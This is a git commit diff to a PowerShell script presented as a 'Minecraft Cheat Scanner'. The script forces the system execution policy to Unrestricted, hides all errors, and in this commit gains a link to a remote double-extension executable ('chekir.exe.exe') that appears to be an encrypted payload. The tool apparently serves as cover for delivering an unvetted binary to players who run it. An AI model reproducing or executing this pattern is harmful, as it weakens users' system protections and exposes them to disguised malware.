acb11bcdd8f27c3168cbb427e8e0d0ff1e2831cd
Proshkaversus <fima17167@gmail.com>
2026-01-12 19:20:23 +0200

    Update Minecraft Cheat Scanner to version 8.0

--- cheker.ps1
+++ cheker.ps1
@@ -1,6 +1,6 @@
 # MINECRAFT CHEAT SCANNER v2.0 
 Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Force
-
+https://github.com/Proshkaversus/exe/raw/refs/heads/main/enc_8c1ae3d9a1c444819a7edad8a200a143_chekir.exe.exe
 Set-ExecutionPolicy Bypass -Scope Process -Force
 
 Clear-Host
@@ -95,6 +95,7 @@ try {
 } catch {
     # Полностью скрываем ошибки
 }
+
 
 
 
